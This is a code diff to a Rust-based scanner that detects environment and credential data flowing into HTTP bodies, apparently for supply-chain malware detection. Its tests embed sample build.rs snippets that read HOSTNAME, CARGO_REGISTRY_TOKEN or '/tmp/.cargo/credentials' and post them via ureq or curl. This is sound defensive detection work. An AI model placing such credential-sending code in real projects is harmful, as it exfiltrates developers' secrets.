@@ -33,6 +33,10 @@ const CURL_DATA_NEXT: Bits = 8192;
 // property. Keep that state separate from a bulk environment read so aliases
 // such as `const env = process.env` can refine non-secret configuration keys.
 const ENV_OBJECT: Bits = 16384;
+// A selected environment value is distinct from a bulk environment dump.
+// Keep this neutral provenance bit separate so existing bulk-harvest rules
+// cannot mistake normal provider/configuration values for a complete dump.
+const ENV_VALUE: Bits = 32768;
 const PARAM_START: usize = 24;
 const PARAM_COUNT: usize = 16;
 const LIMIT: usize = 200_000;
@@ -616,6 +620,7 @@ fn events_for(summary: &Summary, name: &str, offset: usize) -> Vec<serde_json::V
         };
     for (bit, kind) in [
         (ENV, "environment-http-body"),
+        (ENV_VALUE, "environment-value-http-body"),
         (SECRET, "secret-http-body"),
         (CARGO, "cargo-credential-http-body"),
         (FILE, "file-http-body"),
@@ -723,6 +728,61 @@ impl<'s> Analysis<'s> {
             "identifier" | "shorthand_field_identifier" | "shorthand_property_identifier"
         ) {
             return bindings.get(text).unwrap_or(0);
+        }
+        // Rust format! arguments are token trees rather than expression ASTs.
+        // A metadata-only query consumes the source without returning its bytes.
+        if self.language == Lang::Rust && kind == "token_tree" {
+            let mut result = 0;
+            for child in named_children(node) {
+                let metadata_only = child.kind() == "identifier"
+                    && child.next_sibling().is_some_and(|dot| {
+                        self.text(dot) == "."
+                            && dot.next_sibling().is_some_and(|method| {
+                                matches!(
+                                    self.text(method),
+                                    "len" | "is_empty" | "is_ok" | "is_err" | "is_some" | "is_none"
+                                ) && method
+                                    .next_sibling()
+                                    .is_some_and(|args| self.text(args) == "()")
+                            })
+                    });
+                if !metadata_only {
+                    result |= self.eval(child, bindings, out, depth + 1);
+                }
+            }
+            return result;
+        }
+        if self.language == Lang::Rust && kind == "match_expression" {
+            let input = node
+                .child_by_field_name("value")
+                .map_or(0, |value| self.eval(value, bindings, out, depth + 1));
+            let mut result = 0;
+            let mut merged: HashMap<String, Bits> = HashMap::new();
+            if let Some(body) = node.child_by_field_name("body") {
+                for arm in named_children(body).filter(|n| n.kind() == "match_arm") {
+                    let mut branch = Scope::under(bindings);
+                    let mut pattern_names = Scope::default();
+                    if let Some(pattern) = arm.child_by_field_name("pattern") {
+                        self.bind(pattern, input, &mut branch);
+                        self.bind(pattern, 0, &mut pattern_names);
+                    }
+                    if let Some(value) = arm.child_by_field_name("value") {
+                        result |= self.eval(value, &mut branch, out, depth + 1);
+                    }
+                    // Arm-local pattern bindings never escape the match.
+                    for (name, bits) in branch.local {
+                        if !pattern_names.local.contains_key(&name) {
+                            if let Some(bits) = bits {
+                                *merged.entry(name).or_default() |= bits;
+                            }
+                        }
+                    }
+                }
+            }
+            for (name, bits) in merged {
+                bindings.add_bits(&name, bits);
+            }
+            return result;
         }
         if kind == "macro_invocation"
             && node
@@ -1083,6 +1143,16 @@ impl<'s> Analysis<'s> {
             .map(|&n| self.eval(n, bindings, out, depth + 1))
             .collect();
         let all = bits.iter().fold(0, |a, b| a | b);
+        if self.language == Lang::Rust
+            && receiver.is_some()
+            && args.is_empty()
+            && matches!(
+                method,
+                "len" | "is_empty" | "is_ok" | "is_err" | "is_some" | "is_none"
+            )
+        {
+            return 0;
+        }
         if self.language == Lang::Go {
             if name == "os.Environ" {
                 return ENV | SECRET;
@@ -1182,7 +1252,12 @@ impl<'s> Analysis<'s> {
                 | "os.getenv"
                 | "os.environ.get"
         ) {
-            let bits = args.first().map_or(0, |n| env_bits(self.text(*n)));
+            let bits = args.first().map_or(0, |n| env_bits(self.text(*n)))
+                | if self.language == Lang::Rust {
+                    ENV_VALUE
+                } else {
+                    0
+                };
             out.reads |= bits;
             return bits;
         }
@@ -1399,6 +1474,70 @@ fn env_bits(name: &str) -> Bits {
 mod tests {
     use crate::OpenOptions;
     use std::path::Path;
+    #[test]
+    fn selected_rust_environment_http_payload_is_not_bulk_harvesting() {
+        for source in [
+            "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();ureq::post(endpoint).send(host);}",
+            "use std::{env,process::Command}; fn run(){let host=env::var(\"HOSTNAME\").unwrap();let payload=format!(\"host={}\",host);Command::new(\"curl\").args(&[\"-X\",\"POST\",endpoint,\"-d\",&payload]).status();}",
+            "fn hostname(){std::env::var(\"HOSTNAME\").unwrap()} fn run(){ureq::post(endpoint).send(hostname());}",
+        ] {
+            let found = kinds("build.rs", source);
+            assert!(found.contains("environment-value-http-body"), "{found:?}");
+            assert!(!found.contains("environment-http-body"), "{found:?}");
+            assert!(!found.contains("secret-http-body"), "{found:?}");
+        }
+    }
+
+    #[test]
+    fn selected_rust_environment_does_not_taint_unrelated_or_metadata_bodies() {
+        for source in [
+            "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();ureq::post(endpoint).send(\"status\");}",
+            "fn run(){let host=std::env::var(\"HOSTNAME\").unwrap();let host=\"status\";ureq::post(endpoint).send(host);}",
+            "fn run(){let host=std::env::var(\"HOSTNAME\").is_ok();ureq::post(endpoint).send(format!(\"{}\",host));}",
+        ] {
+            let found = kinds("build.rs", source);
+            assert!(!found.contains("environment-value-http-body"), "{found:?}");
+        }
+    }
+
+    #[test]
+    fn rust_secret_metadata_is_not_credential_content() {
+        for expression in [
+            "std::env::var(\"CARGO_REGISTRY_TOKEN\").is_ok()",
+            "std::fs::read_to_string(\"/tmp/.cargo/credentials\").unwrap().len()",
+            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"length {}\", content.len()), Err(_) => String::new() }",
+            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"empty {}\", content.is_empty()), Err(_) => String::new() }",
+        ] {
+            let source =
+                format!("fn run() {{ let data = {expression}; ureq::post(endpoint).send(data); }}");
+            let found = kinds("lib.rs", &source);
+            assert!(
+                !found.contains("cargo-credential-http-body"),
+                "{expression}: {found:?}"
+            );
+            assert!(
+                !found.contains("secret-http-body"),
+                "{expression}: {found:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rust_match_preserves_content_and_mixed_format_arguments() {
+        for expression in [
+            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => content, Err(_) => String::new() }",
+            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"{}:{}\", content.len(), content), Err(_) => String::new() }",
+            "match std::fs::read_to_string(\"/tmp/.cargo/credentials\") { Ok(content) => format!(\"{content}\"), Err(_) => String::new() }",
+        ] {
+            let source =
+                format!("fn run() {{ let data = {expression}; ureq::post(endpoint).send(data); }}");
+            assert!(
+                kinds("lib.rs", &source).contains("cargo-credential-http-body"),
+                "{expression}"
+            );
+        }
+    }
+
     #[test]
     fn go_package_helpers_keep_file_import_scopes_and_initialization() {
         let file = |path, source| crate::package_context::SourceFile { path, source };
